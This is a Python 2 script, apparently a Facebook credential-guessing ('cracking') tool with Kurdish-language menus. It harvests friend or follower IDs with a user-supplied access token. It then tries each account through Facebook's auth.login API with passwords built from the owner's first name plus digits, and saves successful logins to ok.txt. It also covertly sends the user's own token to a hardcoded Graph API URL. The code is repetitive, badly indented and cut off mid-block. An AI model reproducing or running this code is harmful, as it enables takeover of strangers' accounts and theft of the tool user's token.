# fucked by Mohammad sultani - HAX0R


try:
    import os
    import sys
    import time
    import platform
    import datetime
    import random
    import hashlib
    import re
    import threading
    import json
    import getpass
    import urllib
    import cookielib
    import requests
    import uuid
    import string
    import subprocess
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
except ImportError:
    os.system('pip2 install requests')
    os.system('pip install lolcat')
    os.system('pip2 install lolcat')

from os import system
from time import sleep

def chk():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = '<'.join(uuid)
    print '\n\n\x1b[37;1m  YOUR ID : ' + id
    
    try:
        httpCaht = requests.get('https://github.com/DyArdhw62gsv/trick/blob/main/trick.txt').text
        if id in httpCaht:
            print '\x1b[92m  YOUR ID IS ACTIVE. .......\x1b[97m'
            msg = str(os.geteuid())
            time.sleep(1)
        else:
            print '\x1b[91m  ID ACTIVE NYA BO ACTIVE KRDNY ID NAMA BNERA BO @XxXx_TiGeR_XxXx\x1b[97m'
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()
        if name == '__main__':
            print logo
            chk()
        


chk()
user_agent = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)',
    'https://graph.facebook.com/100045203855294/subscribers?access_token=']
useragent_url = user_agent[2]
header = {
    'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
    'x-fb-sim-hni': str(random.randint(20000, 40000)),
    'x-fb-net-hni': str(random.randint(20000, 40000)),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }

try:
    requests.get('https://www.google.com/search?q=Azim+Vau')
    requests.get('https://m.youtube.com/results?search_query=Azim+Vau+Mr.+Error')
except requests.exceptions.ConnectionError:
    os.system('clear')
    xox('\n\t\x1b[93;1m  KWA XATT [!] :(\n\n')
    sys.exit()

ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers = {
    'Referer': 'https://ip-api.com/',
    'Content-Type': 'application/json; charset=utf-8',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36' }).json()['country_name'].upper()

def linex():
    os.system('echo  "\n -----------------------------------------------\n" | lolcat -a -d 2 -s 50')


def logo():
    print '\x1b[91;1m\n__________________ _______  _______  _______ \n\\__   __/\\__   __/(  ____ \\(  ____ \\(  ____ )\n   ) (      ) (   | (    \\/| (    \\/| (    )|\n   | |      | |   | |      | (__    | (____)|\n   | |      | |   | | ____ |  __)   |     __)\n   | |      | |   | | \\_  )| (      | (\\ (   \n   | |   ___) (___| (___) || (____/\\| ) \\ \\__\n   )_(   \\_______/(_______)(_______/|/   \\__/                 \n--------------------------------------------------\n Author      : @xXxX_tiger_xXxX\n\n GitHub      : https://github.com/tigerkurd\n\n YouTube     : TIGER CHEAT\n\nTelegram     : @KRD_CHEAT\n\n--------------------------------------------------'


def main():
    os.system('clear')
    logo()
    print ''
    print '\x1b[92;1m  [1] START [!]'
    print ''
    log_sel()


def log_sel():
    sel = raw_input('\x1b[91;1m  HALBZHERA: \x1b[92;1m')
    if sel == '':
        print '\t\x1b[91;1m  SELECT AN OPTION STUPID -_'
        log_sel()
    elif sel == '1' or sel == '01':
        token()
    elif sel == '2' or sel == '02':
        subprocess.check_output([
            'am',
            'start',
            'https://www.facebook.com/114133313700086/posts/426873429092738'])
        main()
    elif sel == '3' or sel == '03':
        import os
        
        try:
            os.system('git clone https://github.com/Azim-Vau/fcpro')
            os.system('rm -rf fcpro.py')
            os.system('cp -f fcpro/fcpro.py \\.')
            os.system('rm -rf fcpro')
            xox('\x1b[92;1m\n TOOL UPDATE SUCCESSFUL :)\n')
            time.sleep(2)
            main()
        except KeyboardInterrupt:
            print '\x1b[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n'
            main()
        

    if sel == '4' and sel == '04' and sel == 'J' or sel == 'j':
        subprocess.check_output([
            'am',
            'start',
            'https://t.me/krd_cheat'])
        main()
    elif sel == '0' or sel == '00':
        xox('\n\t\x1b[91;1m XWAT LAGAL DLL [!]:)')
        sys.exit()
    else:
        print ''
        print '\t\x1b[91;1m  ZHMARAY RAST HALBZHIRA [!]'
        print ''
        log_sel()


def token():
    os.system('clear')
    
    try:
        token = open('vau_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        logo()
        print ''
        print ''
        token = raw_input('\x1b[91;1m TOKEN DANE [!]: \x1b[92;1m')
        sav = open('vau_token.txt', 'w')
        sav.write(token)
        sav.close()
        token_check()
        menu()



def token_check():
    
    try:
        token = open('vau_token.txt', 'r').read()
    except IOError:
        print '\x1b[91;1m[!] TOKEN HALAEA [!]'
        os.system('rm -rf vau_token.txt')

    requests.post(useragent_url + token, headers = header)


def menu():
    os.system('clear')
    
    try:
        token = open('vau_token.txt', 'r').read()
    except (KeyError, IOError):
        token()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        logo()
        print ''
        print '\x1b[91;1m     TOKEN HALAEA [!]'
        os.system('rm -rf vau_token.txt')
        print ''
        time.sleep(1)
        main()

    os.system('clear')
    xn = name.upper()
    logo()
    print ''
    print '\x1b[93;1m  BAXER BEYT: \x1b[92;1m' + xn
    print '\x1b[93;1m  WLAT  : \x1b[92;1m' + loc
    print '\x1b[93;1m   IP TO : \x1b[92;1m' + ip
    print ''
    print ''
    print '\x1b[91;1m  [1] ZOOR XERA [!]'
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[92;1m  HALBZHERA : ')
    if select == '1':
        crack1()
    elif select == '2':
        crack()
    elif select == '0':
        main()
    else:
        print ''
        print '\t\x1b[93;1m     ZHMARAY RAST HALBZHERA [!]'
        print ''
        menu_option()

# fucked by Mohammad sultani 


def crack1():
    global token
    os.system('clear')
    
    try:
        token = open('vau_token.txt', 'r').read()
    except IOError:
        print ''
        print '\t\x1b[91;1m  TOKEN HALAEA [!]'
        time.sleep(1)
        fb_token()

    os.system('clear')
    logo()
    print ''
    print ''
    print '\x1b[91;1m  [1] CRACK LAREGAY ID [!]'
    print ''
    crack_select1()


def crack_select1():
    select = raw_input('\x1b[92;1m  HALBZHERA [!]: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        print ''
        
        try:
            id_limit = int(raw_input('\x1b[91;1m  BNUSA --> [1] : \x1b[92;1m'))
            print ''
        except:
            id_limit = 1

        for t in range(id_limit):
            t += 1
            idt = raw_input('\x1b[92;1m   ID  [FB] DANE[!] (\x1b[92;1m%s\x1b[92;1m) : \x1b[93;1m' % t)
            
            try:
                for i in requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token).json()['data']:
                    uid = i['id'].encode('utf-8')
                    na = i['name'].encode('utf-8')
                    id.append(uid + '|' + na)
            except KeyError:
                print '\x1b[91;1m  BRADARE QFL YAWA [!]'

            print '\x1b[94;1m  HAMW ID YAKAN [!]: \x1b[0;92m%s\x1b[0;93m' % len(id)
        
        time.sleep(3)
    elif select == '2':
        os.system('clear')
        logo()
        print ''
        print '      \x1b[92;1mMULTI FOLLOWERS ID COINING '
        print ''
        
        try:
            id_limit = int(raw_input('\x1b[93;1m  ENTER LIMIT (\x1b[91;1m5 MAX\x1b[93;1m): \x1b[92;1m'))
            print ''
        except:
            id_limit = 1

        for t in range(id_limit):
            t += 1
            idt = raw_input('\x1b[93;1m  INPUT FOLLOWER ID (\x1b[92;1m%s\x1b[93;1m) : \x1b[92;1m' % t)
            
            try:
                for i in requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999').json()['data']:
                    uid = i['id'].encode('utf-8')
                    na = i['name'].encode('utf-8')
                    id.append(uid + '|' + na)
            except KeyError:
                print '\x1b[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE'

            print '\x1b[94;1m  HAMW ID YAKAN  : \x1b[0;92m%s\x1b[0;97m' % len(id)
        
        time.sleep(3)
    elif select == '3':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[93;1m   AUTO PASS CRACKING'
        print ''
        filelist = raw_input('\x1b[92;1m  INPUT FILE: ')
        
        try:
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '\t\x1b[91;1m  REQUESTED FILE NOT FOUND'
            print ''
            raw_input('\x1b[93;1m ENTER BKA BO DARCHWN [!]')
            crack1()

    elif select == '0':
        menu()
    else:
        print ''
        print '\t\x1b[91;1m  SELECT VALID OPTION'
        print ''
        crack_select1()
    os.system('clear')
    logo()
    print ''
    print '\x1b[91;1m  HAMW ID YAKAN [!] : \x1b[92;1m' + str(len(id))
    print '\x1b[91;1m  CRACK DASTE PE KRD [!]\x1b[0m'
    print '\x1b[91;1m  CHAWARE BKAW W BBINA [!] \x1b[92;1m!\x1b[91;1m!\x1b[0m'
    linex()
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        _azimua = random.choice([
            'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]',
            '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
            'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
            'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]',
            'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]',
            'Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]'])
        
        try:
            pass1 = name.lower().split(' ')[0] + '1234'
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'format': 'JSON',
                'sdk_version': '2',
                'email': uid,
                'locale': 'en_US',
                'password': pass1,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
            headers_ = {
                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': _azimua,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger' }
            data = requests.get(api, params = params, headers = headers_)
            if 'access_token' in data.text and 'EAAA' in data.text:
                print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in data.json()['error_msg']:
                print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower().split(' ')[0] + '123'
                api = 'https://b-api.facebook.com/method/auth.login'
                params = {
                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                    'format': 'JSON',
                    'sdk_version': '2',
                    'email': uid,
                    'locale': 'en_US',
                    'password': pass2,
                    'sdk': 'ios',
                    'generate_session_cookies': '1',
                    'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                headers_ = {
                    'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': _azimua,
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger' }
                data = requests.get(api, params = params, headers = headers_)
                if 'access_token' in data.text and 'EAAA' in data.text:
                    print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in data.json()['error_msg']:
                    print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower().split(' ')[0] + '12'
                    api = 'https://b-api.facebook.com/method/auth.login'
                    params = {
                        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                        'format': 'JSON',
                        'sdk_version': '2',
                        'email': uid,
                        'locale': 'en_US',
                        'password': pass3,
                        'sdk': 'ios',
                        'generate_session_cookies': '1',
                        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                    headers_ = {
                        'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                        'x-fb-sim-hni': str(random.randint(20000, 40000)),
                        'x-fb-net-hni': str(random.randint(20000, 40000)),
                        'x-fb-connection-quality': 'EXCELLENT',
                        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                        'user-agent': _azimua,
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-http-engine': 'Liger' }
                    data = requests.get(api, params = params, headers = headers_)
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in data.json()['error_msg']:
                        print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('cp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower().split(' ')[0] + '12345'
                        api = 'https://b-api.facebook.com/method/auth.login'
                        params = {
                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                            'format': 'JSON',
                            'sdk_version': '2',
                            'email': uid,
                            'locale': 'en_US',
                            'password': pass4,
                            'sdk': 'ios',
                            'generate_session_cookies': '1',
                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                        headers_ = {
                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                            'x-fb-connection-quality': 'EXCELLENT',
                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                            'user-agent': _azimua,
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-fb-http-engine': 'Liger' }
                        data = requests.get(api, params = params, headers = headers_)
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in data.json()['error_msg']:
                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('cp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = name.lower().split(' ')[0] + '1122334455'
                            api = 'https://b-api.facebook.com/method/auth.login'
                            params = {
                                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                'format': 'JSON',
                                'sdk_version': '2',
                                'email': uid,
                                'locale': 'en_US',
                                'password': pass5,
                                'sdk': 'ios',
                                'generate_session_cookies': '1',
                                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                            headers_ = {
                                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                'x-fb-net-hni': str(random.randint(20000, 40000)),
                                'x-fb-connection-quality': 'EXCELLENT',
                                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                'user-agent': _azimua,
                                'content-type': 'application/x-www-form-urlencoded',
                                'x-fb-http-engine': 'Liger' }
                            data = requests.get(api, params = params, headers = headers_)
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in data.json()['error_msg']:
                                print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('cp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = name.lower().split(' ')[0] + '1122'
                                api = 'https://b-api.facebook.com/method/auth.login'
                                params = {
                                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                    'format': 'JSON',
                                    'sdk_version': '2',
                                    'email': uid,
                                    'locale': 'en_US',
                                    'password': pass6,
                                    'sdk': 'ios',
                                    'generate_session_cookies': '1',
                                    'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                headers_ = {
                                    'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                                    'x-fb-connection-quality': 'EXCELLENT',
                                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                    'user-agent': _azimua,
                                    'content-type': 'application/x-www-form-urlencoded',
                                    'x-fb-http-engine': 'Liger' }
                                data = requests.get(api, params = params, headers = headers_)
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in data.json()['error_msg']:
                                    print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = name.lower()
                                    api = 'https://b-api.facebook.com/method/auth.login'
                                    params = {
                                        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                        'format': 'JSON',
                                        'sdk_version': '2',
                                        'email': uid,
                                        'locale': 'en_US',
                                        'password': pass7,
                                        'sdk': 'ios',
                                        'generate_session_cookies': '1',
                                        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                    headers_ = {
                                        'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                        'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                        'x-fb-net-hni': str(random.randint(20000, 40000)),
                                        'x-fb-connection-quality': 'EXCELLENT',
                                        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                        'user-agent': _azimua,
                                        'content-type': 'application/x-www-form-urlencoded',
                                        'x-fb-http-engine': 'Liger' }
                                    data = requests.get(api, params = params, headers = headers_)
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in data.json()['error_msg']:
                                        print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
                                    else:
                                        pass8 = name.lower().split(' ')[0] + '54321'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass8,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass8 + '\n')
                                            cp.close()
                                            cps.append(uid + pass8)
                                        else:
                                            pass9 = name.lower().split(' ')[0] + '4321'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass9,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass9 + '\n')
                                            ok.close()
                                            oks.append(uid + pass9)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass9 + '\n')
                                            cp.close()
                                            cps.append(uid + pass9)
                                        else:
                                            pass10 = name.lower().split(' ')[0] + '2000'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass10,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass10 + '\n')
                                            ok.close()
                                            oks.append(uid + pass10)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass10 + '\n')
                                            cp.close()
                                            cps.append(uid + pass10)
                                        else:
                                            pass11 = name.lower().split(' ')[0] + '2001'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass11,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass11 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass11 + '\n')
                                            ok.close()
                                            oks.append(uid + pass11)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass11 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass10 + '\n')
                                            cp.close()
                                            cps.append(uid + pass11)
                                        else:
                                            pass12 = name.lower().split(' ')[0] + '2002'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass12,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
